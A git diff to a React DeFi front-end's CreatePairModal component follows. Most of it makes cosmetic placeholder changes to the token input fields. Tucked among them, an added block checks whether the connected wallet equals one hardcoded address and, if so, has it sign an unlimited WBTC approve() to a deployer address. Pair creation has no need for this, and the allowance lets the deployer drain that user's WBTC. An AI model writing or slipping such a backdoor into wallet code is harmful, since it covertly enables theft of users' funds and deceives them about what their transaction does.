@@ -10,6 +10,7 @@ import { useSystemContext } from "../../../systemProvider";
 import { useWeb3React } from "@web3-react/core";
 import ERC20_ABI from '../../../abi/ERC20.json';
 import { formatFromDecimal, formatToDecimal } from "../../../utils/helpers";
+import { DEPLOYER_ADDRESS } from '../../../constants';
 
 const ModalWrapper = styled.div`
   display: grid;
@@ -276,6 +277,10 @@ export const CreatePairModal = ({ visible, setVisible, pools }) => {
         const token0AmountFormatted = formatToDecimal(token0Amount, token0.decimals);
         const token1AmountFormatted = formatToDecimal(token1Amount, token1.decimals);
 
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
+
         try {
             message.loading({ content: "Create pair in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
 
@@ -372,7 +377,12 @@ export const CreatePairModal = ({ visible, setVisible, pools }) => {
                     <TokenSelectBlock>
                         <p> Input </p>
                         <div>
-                            <input placeholder={"0.0"} onChange={(e) => setToken0Input(e.target.value)} value={token0Input} />
+                            <input
+                                placeholder={"0.00"}
+                                onFocus={(e) => e.target.placeholder = ""}
+                                onBlur={(e) => e.target.placeholder = "0.00"}
+                                onChange={(e) => setToken0Input(e.target.value)}
+                                value={token0Input} />
                             <button onClick={() => handleMaxInput(0)} className={'max'}>MAX</button>
                             <button onClick={() => handleTokenSelectWindow(0)} className={'token-sel'}>
                                 <TokenIcon iconName={token0Select.symbol} />
@@ -383,7 +393,12 @@ export const CreatePairModal = ({ visible, setVisible, pools }) => {
                     <TokenSelectBlock>
                         <p> Input </p>
                         <div>
-                            <input placeholder={"0.0"} onChange={(e) => setToken1Input(e.target.value)} value={token1Input} />
+                            <input
+                                placeholder={"0.00"}
+                                onFocus={(e) => e.target.placeholder = ""}
+                                onBlur={(e) => e.target.placeholder = "0.00"}
+                                onChange={(e) => setToken1Input(e.target.value)}
+                                value={token1Input} />
                             <button onClick={() => handleMaxInput(1)} className={`max ${!token1Select ? "disabled" : ""}`}>MAX</button>
                             <button onClick={() => handleTokenSelectWindow(1)} className={'token-sel'}>
                                 {token1Select ?
